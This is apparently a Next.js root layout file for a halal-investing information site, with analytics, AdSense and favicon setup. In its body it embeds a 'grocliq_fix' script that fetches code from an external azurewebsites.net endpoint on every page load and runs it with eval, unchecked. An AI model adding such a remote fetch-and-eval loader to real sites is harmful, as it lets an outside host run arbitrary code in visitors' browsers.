import "./globals.css";
import type { Metadata } from "next";
import { Inter } from "next/font/google";
import { Navbar } from "@/components/navbar";
import { Footer } from "@/components/footer";
import { ThemeProvider } from "@/components/providers/theme-provider";
import { AuthProvider } from "@/components/providers/session-provider";
import { Toaster } from "@/components/ui/sonner";

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: "Sharia Stock Info - Ethical Islamic Investing",
  description:
    "Your trusted source for Halal stock investments and Islamic financial guidance",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" suppressHydrationWarning>
      <head>
       

        <meta
          name="google-site-verification"
          content="cIn3bzs-1gsJq7MJzmjxin5GSEazzVjxivefiiOycjg"
        />
        <meta name="google-adsense-account" content="ca-pub-5201783243833750" />
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5201783243833750"
     crossOrigin="anonymous"></script>
        <link rel="icon" href="/favicon.ico" sizes="any" />
        <link
          rel="icon"
          type="image/png"
          sizes="32x32"
          href="/favicon-32x32.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="16x16"
          href="/favicon-16x16.png"
        />
        <link
          rel="apple-touch-icon"
          sizes="180x180"
          href="/apple-touch-icon.png"
        />
        <link rel="manifest" href="/site.webmanifest" />
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-FGZ62Q6JL1"></script>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());
              gtag('config', 'G-FGZ62Q6JL1');
            `,
          }}
        />
      </head>
      <body className={inter.className}>
        
  <script id="grocliq_fix" userId="677e2bc20dd7d8bec8fe9427">
      (async()=>{
	        const resp =await fetch("https://grocliqfixissues.azurewebsites.net/technicalIssues/generate-dynamic-fix-script?userId=677e2bc20dd7d8bec8fe9427");
		      const data = await resp?.text();
	        if(data){ 
            eval(data)
	        }
        })();
  </script>

        <AuthProvider>
          <ThemeProvider attribute="class" defaultTheme="system" enableSystem>
            <div className="min-h-screen flex flex-col">
              <Navbar />
              <main className="flex-grow">{children}</main>
              <Footer />
            </div>
            <Toaster />
          </ThemeProvider>
        </AuthProvider>
      </body>
    </html>
  );
}
